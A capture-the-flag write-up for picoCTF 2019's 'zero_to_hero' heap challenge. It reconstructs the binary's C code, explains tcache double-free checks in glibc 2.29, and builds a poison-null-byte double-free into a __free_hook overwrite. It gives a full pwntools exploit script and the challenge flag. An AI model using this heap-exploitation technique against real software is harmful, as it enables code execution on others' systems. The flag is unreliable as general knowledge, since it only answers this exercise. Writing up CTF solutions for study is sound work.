# zero_to_hero
> Now you're really cooking. Can you pwn this service?. Connect with nc 2019shell1.picoctf.com 45180. libc.so.6 ld-2.29.so

> Hints:
> Make sure to both files are in the same directory as the executable, and set LD_PRELOAD to the path of libc.so.6

In one sentence, this exploit is tcache poison triggered by a poison null byte to gain arbitrary write.

As the first step always is, we begin by reversing the binary with ghidra. After some beautification, we get the following C code. 
```c
#include <stdio.h>

(char*) powers[8];

// Returns the number of non-null powers in the array no more than 6, else -1
int count_powers() {
	unsigned int ct = 0;
	for (ct = 0; powers[ct] != NULL; ct++)
		if (ct > 6)
			return -1;
	return ct;
}

void do_add() {
	int num_powers = count_powers();
	if (num_powers < 0) {
		puts("You have too many powers!");
		exit(-1);
	}
	puts("Describe your new power.");
	puts("What is the length of your description?");
	printf("> ");
	unsigned int size = 0;
	scanf("%u",&size);
	getchar();
	// This allows for unsorted bin size but not largebin
	if (size > 0x408) {
		puts("Power too strong!");
		exit(-1);
	}
	powers[num_powers] = (char *)malloc(size);
	puts("Enter your description: ");
	printf("> ");
	ssize_t amt = read(0, powers[num_powers], size);
	powers[num_powers][amt] = '\x00';

	puts("Done!");
	return;
}

// Blindly frees the requested pointer
void do_remove() {
	unsigned int choice = 0;
	puts("Which power would you like to remove?");
	printf("> ");
	scanf("%u",&choice);
	getchar();
	if (6 < choice) {
		puts("Invalid index!");
		exit(-1);
	}
	free(powers[choice]);
	return;
}

int main() {
	/* Flush buffer on newline or when buffer is full */
	setvbuf(stdin,NULL,_IOLBF,0);
	setvbuf(stdout,NULL,_IOLBF,0);
	setvbuf(stderr,NULL,_IOLBF,0);

	puts("From Zero to Hero");
	puts("So, you want to be a hero?");

	char ans[24];
	ssize_t amt = read(0,ans,0x14);
	ans[amt] = '\x00';
	if (ans[0] != 'y') {
		puts("No? Then why are you even here?");
		exit(0);
	}
	puts("Really? Being a hero is hard.");
	puts("Fine. I see I can\'t convince you otherwise.");
	// Hooray, they leak system for us
	printf("It\'s dangerous to go alone. Take this: %p\n",system);

	int choice;
	while (true) {
		menu()
		printf("> ")
		choice = 0;
		scanf("%d",&choice);
		getchar();
		switch(choice) {
			case 1:
				do_add();
				break;
			case 2:
				do_remove();
				break;
			case 3:
				puts("Giving up?")
				exit(0);
		}
	}
}
```
Before continuing, we note that there is a hidden ``win()`` function that is referenced nowhere else in the program. It simply prints out the flag from the file ``flag.txt``.

With the ``malloc``s thrown everywhere, this is a heap exploitation problem, so it's time to look for heap exploits. The first bug in this program is reasonably obvious, and it lives in the deletion.
```c
// Blindly frees the requested pointer
void do_remove() {
	unsigned int choice = 0;
	puts("Which power would you like to remove?");
	printf("> ");
	scanf("%u",&choice);
	getchar();
	if (6 < choice) {
		puts("Invalid index!");
		exit(-1);
	}
	free(powers[choice]); // It doesn't null out the pointer!
	return;
}
```
Notably, the pointers stay even after a chunk gets freed, which means we can in theory free a chunk twice to trigger double-free.

However, simply attempting to free power 0, free power 1, and free power 0 again will fail, and the reason for this is that we are using libc 2.29. Indeed, we are greeted with the following error message:
```
free(): double free detected in tcache
```
How dissappointing.

We quickly review how tcache operates here. In brief, tcache stores many linked lists of freed chunks for each size from ``0x20`` up to the maximum that we can allocate in the program. Whenever a chunk is freed of, say, size ``0x60`` is freed, the pointer stored in tcache corresponding to the linked list of freed chunks of size ``0x60`` gets thrown into the metadata of the freed chunk. So before the freeing, the heap might look like:
```
[tcache]: 0x0000000000000000 0x0000000000000251 <- size of tcache
          ...
          0xPOINTER FOR 0x60 0xPOINTER FOR 0x70
          ...
[chunk] : 0x0000000000000000 0x0000000000000061 <- top of the chunk stores size metadata
          0xdaedbeefdeadbeef 0xdeadbeefdeadbeef <- actual user data
          ...
```
And now we free the ``[chunk]`` of size ``0x60``, so the heap looks like
```
[tcache]: 0x0000000000000000 0x0000000000000251
          ...
          0xPOINTER TO chunk 0xPOINTER FOR 0x70
          ...
[chunk] : 0x0000000000000000 0x0000000000000061
          0xPOINTER FOR 0x60 0xdeadbeefdeadbeef <- now the pointer to the next 0x60 lives here
          ...                                      naturally, this was the pointer in tcache
```
This will grow a linked list of chunks of size ``0x60`` in which tcache stores the head, and the first freed chunk of size ``0x60`` stores a null byte ``0x0``. And conversely, whenever a chunk of size ``0x60`` is requested by malloc, tcache simply hands back the pointer that it has stored for that size and takes back the pointer stored in the metadata of the freed chunk. In theory, this pointer in the metadata points to the next freed chunk if the linked list is operating properly, so we have simply shrunk the linked list of freed chunks of size ``0x60`` by removing the element directly after the head in tcache. Essentially, it is the earlier described process, in reverse.

That's what happens when things are working correctly. Two things about tcache are worthy of note: First, there are no checks when tcache returns a pointer to malloc. If we can corrupt the tcache, then when malloc asks for a chunk of some size, malloc will simply let us write with whatever corrupted pointers are stored in tcache. And second, the only protection that tcache has against double-free is that it makes sure the current chunk being freed is different from all chunks freed earlier _of the same size._

With this freeing check in mind, it makes sense that we got the above double-free detected: If superpower ``0`` was a chunk of size ``0x110`` (say), then freeing it once adds the pointer into tcache's linked list of freed chunks of size ``0x110``, but then freeing it again of course doesn't pass the check. After all, the pointer already lives on the freed linked list, so tcache's linked list check on chunks of size ``0x110`` will declare an error and abort.

The key observation, now, is that tcache is only checking chunks of the same size against each other. Because the pointers are maintained, all intuition points towards trying to somehow get a double-free exploit working, but we can't free a chunk of the same size twice. The solution? We convince tcache that the same chunk has two different sizes.

This brings us to the second bug in the program, and it lives in the writing.
```c
	puts("Enter your description: ");
	printf("> ");
	ssize_t amt = read(0, powers[num_powers], size);
	powers[num_powers][amt] = '\x00';

	puts("Done!");
	return;
```
There is a subtle but dangerous off-by-one error here. In particular, when reading into the text for the superpower, it lets us write tons of characters, and then it wil append a null byte to the end of whatever we have written. However, if we asked for, say, ``40`` bytes to write in, then we will get to write ``40`` characters, and then the null byte will be placed outside of the current chunk.

To exploit this, we return to the earlier idea of trying to convince tcache that one chunk has two different sizes. Let's suppose that the heap (excluding the memory given to tcache) currently looks something like this:
```
[chunk 1]: 0x0000000000000000 0x0000000000000031 <- top of the chunk stores size metadata
           0x0000000000000000 0x0000000000000000 <- actual space for user data
           0x0000000000000000 0x0000000000000000
[chunk 2]: 0x0000000000000000 0x0000000000000111 <- the next chunk's metadata
           ...
```
If we free chunk 2 now, tcache will see that it has size ``0x110`` (of course ignoring the ``prev_in_use`` bit) and then store a pointer to chunk 2 inside of the tcache linked list of freed chunks of size ``0x110``.

Now, suppose we write into chunk 1 to the brim, and as discussed before, it will write the null byte ``0x00`` into the next chunk. Before writing the null byte, the haep looks like this:
```
[chunk 1]: 0x0000000000000000 0x0000000000000031
           0xdaedbeefdeadbeef 0xdaedbeefdeadbeef
           0xdaedbeefdeadbeef 0xdaedbeefdeadbeef
[chunk 2]: 0xdaedbeefdeadbeef 0x0000000000000111
           ...
```
And now the program writes in the null byte, so the heap looks like this:
```
[chunk 1]: 0x0000000000000000 0x0000000000000031
           0xdaedbeefdeadbeef 0xdaedbeefdeadbeef
           0xdaedbeefdeadbeef 0xdaedbeefdeadbeef
[chunk 2]: 0xdaedbeefdeadbeef 0x0000000000000100 <- poison null byte!
           ...
```
Uh-oh: We've overwritten the size metadata for chunk 2! So if we free chunk 2 again, tcache will store the second chunk inside of the linked list of freed chunks of size ``0x100`` because that's what the chunk says its size is. We have now successfully bypassed the tcache check to obtain a double-free, once for freeing into the ``0x110`` linked list, and a second time for freeing into the ``0x100`` linked list.

It turns out that this idea is possible in the given program, albeit with a bit of phenangling in order to write to a chunk above another chunk. This can be done by first requesting the ``0x30``, requesting the ``0x110``, then freeing the ``0x30`` and then asking for it again.

Before continuing, we remark again that malloc does no checks on the pointer that tcache gives it: If tcache hands malloc a pointer, then malloc will return that pointer immediately. Thus, atypical with most double-frees, not only can we write any pointer into tcache (this is a part of the double-free exploit, which I will not explain here), we can also coerce malloc into letting us write to that pointer's location, with no intermediate checks. This is the most arbitrary write possible.

The rest of the attack is just a matter of figuring out where to write. After sufficient frustration and googling, we find the pointer ``__free_hook``, stored in a writable area of libc. (Briefly note that we have a libc address leaked by the program directly---they give us system.) The pointer ``__free_hook`` simply redirects the actions of ``free`` to whatever function ``__free_hook`` happens to point to, so rewriting ``__free_hook`` will make ``free`` call an arbitrary function. Well, what better function to overwrite ``__free_hook`` with than the literal ``win()`` function mentioned at the beginning. Doing so will finish the problem.

Here is the final exploit code.
```python3
from pwn import *
import time

# p = process('./zero_to_hero', env={"LD_PRELOAD": "libc.so.6"})
p = remote('2019shell1.picoctf.com',45180)

def wait():
    time.sleep(0.15)
def flush():
    return p.recv(4096)

def create(s, l):
    p.sendline('1')
    p.sendline(str(l))
    p.sendline(s)
    wait()
def remove(n):
    p.sendline('2')
    p.sendline(str(n))
    wait()

p.sendline('yes')
wait()

data = p.recv(4096)
# print data
SYSTEM = int(data.split('\n')[4][39:], 16)
LIBC_BASE = SYSTEM - 0x2C550
MALLOC_HOOK = LIBC_BASE + 0x72380

# at 0x1e3ef8 in file
FREE_HOOK = LIBC_BASE + 0x1C0B28
print "== LEAKED LIBC: {} ==".format(hex(LIBC_BASE))

raw_input("[begin exploit]")

raw_input("[malloc chunk A, size 0x30]")
create("AAAA", 40)
raw_input("[malloc chunk B, size 0x110]")
create("BBBB", 264)

raw_input("[free chunk B]")
remove(1)

raw_input("[free chunk A; we will get it later so we can write to it again]")
remove(0)
raw_input("[malloc (again) chunk A with len = 40; overwrite chunk B]")
create("aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj", 40)

raw_input("[free chunk B again (double free)]")
remove(1)

p.recv(4096)

inp = raw_input("[malloc chunk of size 0x100]")
create(p64(FREE_HOOK), 248)

raw_input("[malloc the same chunk of size 0x110]")
create("1111222233334444", 264)

raw_input("[malloc for arbitrary write]")
# 0x400a02 is the location of win()
create(p64(0x400a02), 264)

raw_input("[win]")
remove(0)

p.interactive()
```
And the flag is
> ``picoCTF{i_th0ught_2.29_f1x3d_d0ubl3_fr33?_pramlxuc}``

No, libc 2.29 did not fix double-free.
